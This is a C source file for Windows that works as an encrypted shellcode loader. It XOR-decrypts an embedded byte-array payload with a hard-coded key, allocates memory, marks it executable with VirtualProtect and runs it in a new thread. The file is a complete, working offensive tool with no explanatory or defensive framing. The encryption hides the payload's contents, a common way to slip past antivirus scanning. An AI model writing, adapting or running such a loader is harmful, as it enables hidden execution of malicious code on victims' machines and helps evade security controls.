#include <stdio.h>
#include <windows.h>
#include <time.h>

#define okay(msg, ...) printf("[+] " msg "\n", ##__VA_ARGS__)
#define info(msg, ...) printf("[*] " msg "\n", ##__VA_ARGS__)
#define warn(msg, ...) printf("[-] " msg "\n", ##__VA_ARGS__)

void xor_decrypt(unsigned char* shellcode, size_t shellcode_size, unsigned char* key, size_t key_size) {
    // Simple XOR decryption logic (you can add your own here)
    for (size_t i = 0; i < shellcode_size; i++) {
        shellcode[i] ^= key[i % key_size];
    }
}

int main() {
    unsigned char shellcode[] = "\xab\x00\xc2\xb0\xb4\xa9\x9f\x49\x47\x4d\x00\x1f\x04\x03\x05\x01\x7f\x95\x3c\x09\xdf\x01\x2f\x19\x01\xc4\x17\x59\x02\x05\xd2\x10\x61\x06\xca\x3c\x11\x0e\x5a\xf4\x01\x13\x02\x64\x9e\x00\x70\x94\xe8\x7d\x32\x35\x45\x61\x61\x0f\x84\x9a\x5a\x08\x4f\x86\xbb\xac\x06\x1b\xc4\x1a\x69\xc4\x07\x7d\x1c\x4c\x89\x03\x10\x28\xc0\x36\x59\x4d\x57\x4c\xce\x2b\x4f\x55\x57\xc3\xc1\xdc\x44\x41\x53\x01\xc2\x8d\x35\x29\x0d\x52\x87\x19\x0a\xcc\x19\x61\x1d\x52\x9f\xc3\x01\x57\xa6\x17\x19\x7c\x90\x0a\xbe\x87\x00\xc5\x75\xce\x1d\x42\x9d\x11\x7e\x95\x16\x89\x88\x59\xe8\x00\x52\x88\x7f\xad\x34\xbf\x09\x50\x1b\x6d\x46\x02\x60\x90\x21\x8b\x17\x0c\xc2\x0f\x61\x08\x55\x9d\x3f\x03\xca\x42\x09\x0a\xca\x06\x49\x0a\x4a\x89\x0e\xde\x53\xc0\x00\x0c\x05\x19\x0d\x01\x46\x9d\x18\x14\x04\x0b\x16\x10\x0f\x1d\x11\xc2\xb8\x73\x0e\x1a\xb6\xaf\x1d\x00\x0d\x17\x11\xc9\x53\xa7\x0a\xb1\xbe\xb9\x08\x0a\xf5\x2e\x3c\x67\x08\x7b\x73\x54\x44\x00\x05\x00\xce\xab\x09\xcf\xa9\xf3\x56\x49\x4e\x0e\xd0\xa4\x1d\xef\x4d\x48\x6e\x40\x85\xe9\xab\xcf\x18\x16\x08\xc7\xa5\x02\xc8\xb7\x14\xf9\x07\x2e\x69\x52\xa8\x9d\x0d\xdd\xae\x29\x52\x48\x47\x4d\x18\x0f\xff\x7a\xd7\x22\x4e\xb8\x8c\x2b\x5e\x12\x11\x18\x19\x02\x74\x88\x19\x7c\x99\x0a\xbe\x8e\x09\xc7\x83\x0e\xaa\x83\x03\xd0\x8e\x14\xed\xa2\x4e\x8b\xa4\xbe\x86\x01\xce\x8a\x2b\x5e\x04\x0b\x1b\xc0\xac\x0f\xd0\xb8\x15\xe9\xd6\xed\x3d\x2e\xba\x94\xd1\x8d\x2d\x48\x08\xb1\x8f\x3b\xa4\xae\xc6\x43\x4b\x59\x07\xd6\xbb\x58\x09\xdd\xa6\x0c\x62\x80\x2d\x49\x00\x16\x0d\xda\xae\x08\xf4\x45\x80\x89\x0b\xac\x9a\xcb\xb1\x4f\x3b\x14\x1c\xce\x9d\x62\x1f\xc7\xb7\x24\x01\x07\x0c\x2b\x4b\x49\x4f\x55\x16\x10\x09\xdd\xb6\x09\x62\x80\x06\xf7\x19\xea\x16\xb6\xa8\x9c\x06\xce\x9a\x08\xdd\x94\x02\x79\x80\x06\xcc\xb1\x1c\xc4\x83\x0a\xc8\xb7\x00\xf4\x43\x9f\x9d\x1c\xb4\x8c\xcc\xad\x57\x35\x69\x0c\x05\x16\x0a\x21\x47\x0d\x41\x4e\x04\x0b\x3d\x49\x14\x06\xe3\x4a\x7b\x5c\x7f\xb7\x9c\x18\x1c\x00\xee\x38\x37\x0f\x20\xb1\x94\x07\xbe\x88\xbc\x7f\xb4\xa6\xb0\x1d\x56\x8b\x09\x7d\x82\x09\xd6\xbf\x32\xf9\x00\xb1\xa2\x0b\x3d\x49\x17\x0e\x9e\x83\xa4\xe6\xed\x1e\xb6\x9a";

    size_t shellcode_size = sizeof(shellcode) - 1;
    unsigned char key[] = "WHATDASIGMANESWINGYATSOHIOEATMYBANANAFUCKYOU";
    size_t key_size = sizeof(key) - 1;
    DWORD old_protect;
    DWORD change_protect;

    xor_decrypt(shellcode, shellcode_size, key, key_size);
    void* execute_memory;

    // VirtualAlloc
    execute_memory = VirtualAlloc(
        NULL,
        shellcode_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if (execute_memory == NULL) {
        warn("Failed to allocate memory %d\n", GetLastError());
        return 1;
    }

    // RtlMoveMemory
    RtlMoveMemory(
        execute_memory,
        shellcode,
        shellcode_size
    );

    okay("Memory allocated at: %p\n", execute_memory);

    // VirtualProtect
    change_protect = VirtualProtect(
        execute_memory,
        shellcode_size,
        PAGE_EXECUTE_READ,
        &old_protect
    );

    if (change_protect == 0) {
        warn("Failed to change memory permissions %d\n", GetLastError());
        return 1;
    }

    okay("Memory protection changed to EXECUTE_READ");

    // CreateThread
    HANDLE thread = CreateThread(
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)execute_memory,
        NULL,
        0,
        NULL
    );

    if (thread == NULL) {
        warn("CreateThread failed with error %d\n", GetLastError());
        return 1;
    }

    WaitForSingleObject(thread, INFINITE);
    CloseHandle(thread);

    return EXIT_SUCCESS;
}
